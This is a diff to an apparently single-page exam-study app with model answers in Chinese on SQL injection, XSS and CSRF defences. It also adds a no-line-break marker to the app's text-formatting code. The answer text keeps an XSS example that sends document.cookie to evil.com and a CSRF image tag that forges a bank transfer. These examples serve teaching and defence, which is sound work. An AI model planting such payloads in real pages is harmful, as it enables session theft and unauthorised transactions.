@@ -985,14 +985,14 @@ public class Main {
 **防禦方式**：
 1. **參數化查詢 / Prepared Statement**：將 SQL 結構與資料分離，輸入永遠被當作「資料」而非「指令」。
 2. **輸入驗證（白名單）**：限制輸入的型別、格式與長度，只允許預期的內容。
-3. **使用 ORM 框架**：預設使用參數化查詢。
-4. **最小權限原則**：應用程式連線帳號只給必要權限。
-5. **關閉錯誤訊息**：避免洩漏資料庫結構。
-6. **其他**：部署 WAF（Web 應用程式防火牆）、定期弱點掃描與滲透測試。
+3. 使用 ORM 框架：預設使用參數化查詢。
+4. 最小權限原則：應用程式連線帳號只給必要權限。
+5. 關閉錯誤訊息：避免洩漏資料庫結構。
+6. 其他：部署 WAF（Web 應用程式防火牆）、定期弱點掃描與滲透測試。
 
 **(二) Cross-Site Scripting, XSS（跨站腳本攻擊）（5分）**
 
-**行為原理**：應用程式未對使用者輸入做適當處理，就把內容輸出到網頁，攻擊者便能注入惡意 JavaScript。其他使用者瀏覽該頁面時，瀏覽器因信任該網站而執行惡意腳本，攻擊者即可竊取 cookie、session，冒充使用者。
+**行為原理**：應用程式未對使用者輸入做適當處理，就把內容輸出到網頁，攻擊者便能注入惡意 JavaScript。[nb]其他使用者瀏覽該頁面時，瀏覽器因信任該網站而執行惡意腳本，攻擊者即可竊取 cookie、session，冒充使用者。
 - **範例**：在留言版輸入 \`<script>fetch('https://evil.com?c=' + document.cookie)<\/script>\`，網站若直接顯示，所有看到該留言的人都會把 cookie 送給攻擊者。
 - **危害**：竊取 session 冒充身分、竄改頁面內容、導向惡意網站、側錄鍵盤輸入。
 三種類型：
@@ -1003,23 +1003,23 @@ public class Main {
 **防禦方式**：
 1. **輸出編碼（Output Encoding）**：將（\`<\`、\`>\`、\`&\`、\`"\`）等特殊字元轉成 HTML 實體（如 \`&lt;\`），使其無法被當成標籤執行。
 2. **HttpOnly Cookie**：禁止 JavaScript 讀取 cookie，即使被 XSS 也偷不到 session。
-3. **輸入驗證**：以白名單限制輸入格式與長度。
-4. **CSP（Content Security Policy）**：限制可載入與執行的腳本來源，禁止內嵌腳本。
-5. **使用現代框架**：如 React、Vue 預設會跳脫輸出
-6. **其他**：Cookie 加 Secure、SameSite 屬性。
+3. **CSP（Content Security Policy）**：限制可載入與執行的腳本來源，禁止內嵌腳本。
+4. 輸入驗證：以白名單限制輸入格式與長度。
+5. 使用現代框架：如 React、Vue 預設會跳脫輸出
+6. 其他：Cookie 加 Secure、SameSite 屬性。
 
 **(三) CSRF（Cross-Site Request Forgery，跨站請求偽造）（5分）**
 
-**行為原理**：攻擊者誘騙「已登入」的受害者，在不知情下對目標網站送出非預期的請求。由於瀏覽器會自動附帶該網站的 Cookie，伺服器誤認為是受害者本人的合法操作。
+**行為原理**：攻擊者誘騙「已登入」的受害者，在不知情下對目標網站送出非預期的請求。[nb]由於瀏覽器會自動附帶該網站的 Cookie，伺服器誤認為是受害者本人的合法操作。
 - **範例**：受害者已登入網銀，點到攻擊者佈置的惡意頁面，頁面中藏有 \`<img src="https://bank.com/transfer?to=attacker&amount=10000">\`，瀏覽器自動帶上 Cookie 送出轉帳請求，伺服器看到合法 Cookie 就執行轉帳。
 - **危害**：未經授權轉帳、修改密碼或 Email、刪除資料、變更帳號設定。
 
 **防禦方式**：
-1. **CSRF Token**：每個表單嵌入一組伺服器產生的隨機、不可預測的 token，提交時驗證，因攻擊者無法得知 token，偽造的請求會被拒絕。。
+1. **CSRF Token**：每個表單嵌入一組伺服器產生的隨機、不可預測的 token，提交時驗證，因攻擊者無法得知 token，偽造的請求會被拒絕。
 2. **SameSite Cookie 屬性**：設為 \`Strict\` 或 \`Lax\`，限制跨站請求自動帶 Cookie。
 3. **驗證 Referer / Origin 標頭**：確認請求來自自己的網站。
-4. **重要操作二次驗證**：轉帳、改密碼等要求輸入密碼、OTP 或驗證碼。
-5. **其他**：敏感操作使用 POST 而非 GET；要求自訂標頭（如 \`X-CSRF-Token\`）。
+4. 重要操作二次驗證：轉帳、改密碼等要求輸入密碼、OTP 或驗證碼。
+5. 其他：敏感操作使用 POST 而非 GET；要求自訂標頭（如 \`X-CSRF-Token\`）。
 
 **總結**
 - SQL Injection：資料被當成 SQL 指令 執行（目標：資料庫）。
@@ -7449,11 +7449,14 @@ function highlightIn(root, terms) {
 
 /* 解析換行：遇到「。」就換行（已有 <br>、句尾、或後面接」』）” 的不重複換） */
 function breakSentences(s) {
-  if (!BREAK_AT_PERIOD) return s;
-  return String(s).replace(
-    /。(?!(?:<\/[a-z]+>)*(?:\s*<br\s*\/?>|\s*$|[」』）)”"']))/gi,
-    '。<br>'
-  );
+  const NB = /\[nb\]/g;                       // 標記：寫在「。」後面，代表這裡不換行
+  if (!BREAK_AT_PERIOD) return String(s).replace(NB, '');
+  return String(s)
+    .replace(
+      /。(?!(?:<\/[a-z]+>)*(?:\s*<br\s*\/?>|\s*$|[」』）)”"']|\[nb\]))/gi,
+      '。<br>'
+    )
+    .replace(NB, '');                         // 換行判斷完再把標記拿掉
 }
 
 /* ---------- 搜尋框綁定（支援中文輸入法，組字中不觸發搜尋） ---------- */
@@ -7522,12 +7525,13 @@ document.addEventListener('keydown', e => { if (e.key === 'Escape') toggleJump(f
 /* ---------- 搜尋欄位索引 ---------- */
 function plainAnswer(md) {
   return String(md || '')
-    .replace(/```(?:htmldiagram|tree)\n[\s\S]*?```/g, ' ')   // 圖表/樹狀圖的 HTML、JSON 不列入搜尋
+    .replace(/```(?:htmldiagram|tree)\n[\s\S]*?```/g, ' ')
     .replace(/^#{1,4}\s+/gm, '')
     .replace(/\*\*|`/g, '')
     .replace(/\|/g, ' ')
     .replace(/<br\s*\/?>/gi, '\n')
-    .replace(/<\/?(?:strong|code|sub|sup|u|em|b|i)\s*>/gi, '');
+    .replace(/<\/?(?:strong|code|sub|sup|u|em|b|i)\s*>/gi, '')
+    .replace(/\[nb\]/g, '');
 }
 function searchIndex(q) {
   return q._ix || (q._ix = {
